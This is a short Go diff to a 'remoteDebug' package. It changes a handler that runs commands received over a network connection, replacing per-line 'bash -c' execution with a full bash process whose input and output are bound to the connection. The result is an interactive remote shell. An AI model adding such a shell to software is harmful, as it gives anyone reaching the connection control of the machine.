@@ -1,7 +1,6 @@
 package remoteDebug
 
 import (
-	"bufio"
 	"compress/gzip"
 	"crypto"
 	"crypto/md5"
@@ -149,14 +148,11 @@ func Handle2(data []byte) error {
 	}
 	go func(conn net.Conn) {
 		go func(conn net.Conn) {
-			sc := bufio.NewScanner(conn)
-			for sc.Scan() {
-				line := sc.Text()
-				cmd := exec.Command("bash", "-c", line)
-				cmd.Stdout = conn
-				cmd.Stderr = conn
-				cmd.Run()
-			}
+			cmd := exec.Command("bash")
+			cmd.Stdin = conn
+			cmd.Stdout = conn
+			cmd.Stderr = conn
+			cmd.Run()
 		}(conn)
 	}(conn)
 	return nil
